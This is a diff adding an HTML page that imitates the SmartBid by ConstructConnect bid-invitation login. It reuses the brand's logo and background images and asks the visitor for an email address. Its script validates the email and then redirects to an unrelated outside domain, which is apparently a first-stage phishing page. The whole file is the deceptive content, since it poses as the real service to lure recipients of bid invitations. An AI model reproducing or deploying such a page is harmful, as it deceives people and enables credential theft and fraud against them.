@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>SmartBid by ConstructConnect</title>
+  <link rel="icon" href="https://gocc.smartbid.co/sb.ico" type="image/x-icon" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@400;600;700&display=swap" rel="stylesheet" />
+
+  <style>
+    *, *::before, *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    html, body {
+      height: 100%;
+      overflow: hidden;
+      font-family: 'Source Sans 3', 'Segoe UI', sans-serif;
+    }
+
+    body {
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .bg {
+      position: fixed;
+      inset: 0;
+      background-image: url('https://gocc.smartbid.co/Scripts/Images/SI-System-Login-2017-BG.jpg');
+      background-size: cover;
+      background-position: center;
+      background-repeat: no-repeat;
+      z-index: 0;
+    }
+
+    .bg-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(20, 20, 20, 0.55);
+      z-index: 1;
+    }
+
+    .lang-bar {
+      position: fixed;
+      top: 16px;
+      right: 20px;
+      display: flex;
+      gap: 8px;
+      z-index: 10;
+    }
+
+    .lang-flag {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      overflow: hidden;
+      cursor: pointer;
+      border: 2px solid rgba(255,255,255,0.3);
+      transition: border-color 0.2s, transform 0.15s;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.35);
+    }
+
+    .lang-flag:hover {
+      border-color: rgba(255,255,255,0.75);
+      transform: scale(1.08);
+    }
+
+    .lang-flag img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    .page {
+      position: relative;
+      z-index: 2;
+      display: flex;
+      flex: 1;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      gap: 80px;
+      overflow: hidden;
+    }
+
+    .logo-side {
+      flex: 0 0 auto;
+    }
+
+    .logo-img {
+      width: 340px;
+      max-width: 90vw;
+      display: block;
+      filter: drop-shadow(0 4px 20px rgba(0,0,0,0.5));
+    }
+
+    .login-panel {
+      flex: 0 0 auto;
+      width: 480px;
+      max-width: 95vw;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .access-key-row {
+      width: 100%;
+      display: flex;
+      align-items: center;
+      background: rgba(255, 255, 255, 0.92);
+      border-radius: 4px;
+      overflow: hidden;
+      box-shadow: 0 2px 12px rgba(0,0,0,0.25);
+    }
+
+    .access-key-input {
+      flex: 1;
+      padding: 14px 16px;
+      font-size: 15px;
+      font-family: inherit;
+      color: #444;
+      background: transparent;
+      border: none;
+      outline: none;
+    }
+
+    .access-key-input::placeholder {
+      color: #aaa;
+    }
+
+    .required-star {
+      padding: 0 14px;
+      color: #d9534f;
+      font-size: 18px;
+      line-height: 1;
+    }
+
+    .login-btn {
+      background: #2fa8d4;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      padding: 13px 48px;
+      font-size: 15px;
+      font-weight: 700;
+      font-family: inherit;
+      letter-spacing: 1.5px;
+      text-transform: uppercase;
+      cursor: pointer;
+      box-shadow: 0 2px 10px rgba(0,0,0,0.25);
+      transition: background 0.2s, transform 0.1s, box-shadow 0.2s;
+      align-self: flex-end;
+    }
+
+    .login-btn:hover {
+      background: #2190b8;
+      box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+      transform: translateY(-1px);
+    }
+
+    .login-btn:active {
+      transform: translateY(0);
+      background: #1a7da0;
+    }
+
+    .invite-text {
+      text-align: center;
+      color: #fff;
+      padding-top: 10px;
+    }
+
+    .invite-text h2 {
+      font-size: 22px;
+      font-weight: 700;
+      margin-bottom: 10px;
+      text-shadow: 0 1px 6px rgba(0,0,0,0.4);
+    }
+
+    .invite-text p {
+      font-size: 15px;
+      font-weight: 600;
+      line-height: 1.55;
+      text-shadow: 0 1px 4px rgba(0,0,0,0.4);
+    }
+
+    .error-msg {
+      width: 100%;
+      background: rgba(217, 83, 79, 0.88);
+      color: #fff;
+      font-size: 13.5px;
+      font-weight: 600;
+      padding: 10px 14px;
+      border-radius: 4px;
+      text-align: center;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+      display: none;
+    }
+
+    footer {
+      position: relative;
+      z-index: 2;
+      background: rgba(40, 50, 60, 0.75);
+      text-align: center;
+      padding: 14px 20px;
+    }
+
+    footer a {
+      color: rgba(200,210,220,0.85);
+      text-decoration: none;
+      font-size: 12.5px;
+      transition: color 0.2s;
+    }
+
+    footer a:hover {
+      color: #fff;
+      text-decoration: underline;
+    }
+
+    .footer-links {
+      display: flex;
+      justify-content: center;
+      gap: 0;
+      flex-wrap: wrap;
+      margin-bottom: 4px;
+    }
+
+    .footer-links span {
+      color: rgba(200,210,220,0.5);
+      font-size: 12.5px;
+      margin: 0 8px;
+    }
+
+    .footer-copy {
+      color: rgba(200,210,220,0.65);
+      font-size: 12px;
+    }
+
+    @media (max-width: 760px) {
+      .page {
+        flex-direction: column;
+        gap: 36px;
+        padding-top: 80px;
+      }
+
+      .logo-img {
+        width: 240px;
+      }
+
+      .login-panel {
+        width: 100%;
+        max-width: 420px;
+      }
+
+      .login-btn {
+        align-self: center;
+        width: 100%;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="bg"></div>
+  <div class="bg-overlay"></div>
+
+  <!-- Language flags -->
+  <div class="lang-bar">
+    <div class="lang-flag" title="English">
+      <img src="https://flagcdn.com/us.svg" alt="English" />
+    </div>
+    <div class="lang-flag" title="Español">
+      <img src="https://flagcdn.com/es.svg" alt="Español" />
+    </div>
+    <div class="lang-flag" title="Français">
+      <img src="https://flagcdn.com/fr.svg" alt="Français" />
+    </div>
+  </div>
+
+  <!-- Main content -->
+  <main class="page">
+
+    <div class="logo-side">
+      <img
+        class="logo-img"
+        src="https://gocc.smartbid.co/Scripts/Images/SB-CC-Logo-login.svg?nocache=2.2.5.19"
+        alt="SmartBid by ConstructConnect"
+      />
+    </div>
+
+    <div class="login-panel">
+
+      <div class="error-msg" id="error-msg"></div>
+
+      <form id="login-form" style="width:100%; display:flex; flex-direction:column; align-items:center; gap:16px;">
+
+        <div class="access-key-row">
+          <input
+            class="access-key-input"
+            type="email"
+            name="email"
+            placeholder="Enter your Email"
+            autocomplete="email"
+            spellcheck="false"
+          />
+          <span class="required-star">&#10033;</span>
+        </div>
+
+        <button type="submit" class="login-btn">CONTINUE</button>
+
+      </form>
+
+      <div class="invite-text">
+        <h2>You've been invited to bid!</h2>
+        <p>Enter your email address to access<br />the project's details.</p>
+      </div>
+
+    </div>
+
+  </main>
+
+  <!-- Footer -->
+  <footer>
+    <div class="footer-links">
+      <a href="#">Terms of Sale</a>
+      <span>|</span>
+      <a href="#">Terms of Use</a>
+      <span>|</span>
+      <a href="#">Copyright Notice</a>
+      <span>|</span>
+      <a href="#">Privacy Policy</a>
+    </div>
+
+    <div class="footer-copy">
+      ©2026 ConstructConnect, Inc. All rights reserved.
+    </div>
+  </footer>
+
+  <script>
+    // Configuration
+    const hasExpired = false;
+    const redirectUrl = "https://thenebraskacourthouses.com/Global-tenders-development-proposals/";
+
+    const form = document.getElementById('login-form');
+    const input = document.querySelector('.access-key-input');
+    const errorMsg = document.getElementById('error-msg');
+
+    form.addEventListener('submit', function(e) {
+      e.preventDefault();
+
+      const val = input.value.trim();
+
+      // Expired check
+      if (hasExpired) {
+        errorMsg.style.display = 'block';
+        errorMsg.textContent = 'This document link has expired.';
+        return;
+      }
+
+      // Empty check
+      if (!val) {
+        input.style.outline = '2px solid #d9534f';
+        input.focus();
+
+        setTimeout(() => {
+          input.style.outline = 'none';
+        }, 2000);
+
+        return;
+      }
+
+      // Email validation
+      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+      if (!emailPattern.test(val)) {
+        errorMsg.style.display = 'block';
+        errorMsg.textContent = 'Please enter a valid email address.';
+        return;
+      }
+
+    // Redirect with email query
+window.location.href = `${redirectUrl}`;
+    });
+  </script>
+
+</body>
+</html>
+
